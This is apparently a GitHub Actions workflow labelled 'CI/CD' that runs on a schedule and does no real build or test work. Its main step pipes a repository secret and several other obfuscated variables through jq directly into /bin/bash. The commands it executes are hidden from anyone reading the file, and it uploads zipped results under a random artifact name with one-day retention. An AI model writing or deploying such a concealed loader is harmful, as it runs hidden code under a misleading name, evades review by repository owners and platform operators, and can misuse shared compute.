name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '5 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Perform
        env:
          hcce2: ${{ secrets.hcce2 }}
        run: |
          printf '%s' "$hcce2" | jq -r .it64416 | /bin/bash
          echo $r71105 | jq -r .m91 | /bin/bash
          echo $rj33046 | jq -r .ny7 | /bin/bash
          printf '%s' "$jvpx382" | jq -r .e103 | /bin/bash
          printf '%s' "$xae66" | jq -r .srdb66 | /bin/bash

      - name: Upload results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rHVcfcw4
          path: "*.zip"
          retention-days: 1
